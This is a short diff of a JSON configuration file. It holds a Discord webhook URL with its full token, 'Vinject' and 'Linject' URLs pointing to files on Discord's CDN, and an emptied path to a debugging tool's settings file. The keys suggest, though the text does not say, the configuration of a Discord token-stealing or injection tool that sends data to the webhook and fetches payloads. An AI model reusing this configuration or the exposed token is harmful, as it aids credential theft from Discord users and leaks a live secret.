@@ -1,6 +1,6 @@
 {
 "WebHook":"https://discord.com/api/webhooks/990203599197962260/6fRaJOq7wze3tAiS6RKPlNd2ZU_27PJebv7m8wbeS1eu1MsxGMG1fjNI-MzrOcBknIk6",
-"Pc21":"C:\\ProgramData\\HTTPDebuggerPro\\settings.xml",
+"Pc21":"",
 "Update":"False",
 "Vinject":"https://cdn.discordapp.com/attachments/998928832809672744/1000062230743756912/4651654",
 "Linject":"https://cdn.discordapp.com/attachments/998928832809672744/999947345951195206/415616541",
